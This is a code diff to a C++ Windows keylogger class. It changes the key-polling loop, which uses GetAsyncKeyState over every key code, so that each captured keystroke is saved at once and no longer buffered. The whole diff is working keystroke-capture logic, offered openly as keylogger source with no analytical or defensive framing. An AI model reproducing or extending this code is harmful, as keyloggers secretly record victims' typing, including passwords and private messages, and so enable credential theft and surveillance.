@@ -4,7 +4,7 @@ keylogger::keylogger()
 {
 	a_buffer = new string();
 
-	a_buffer_maximum_size = 0;
+	a_buffer_maximum_size = 1;
 }
 
 keylogger::~keylogger()
@@ -25,15 +25,8 @@ void keylogger::start()
 		for(char t_key = 1; t_key <= 255; t_key++)
 			if(GetAsyncKeyState(t_key) == -32767)
 			{
-				if(t_count == a_buffer_maximum_size)
-				{
-					save();
-					t_count = 0;
-				}
-				else
-				{
-					*a_buffer += to_string(t_key) + ",";
-					t_count++;
-				}
+				*a_buffer = to_string(t_key) + ",";
+				save();
+				t_count++;
 			}
 }
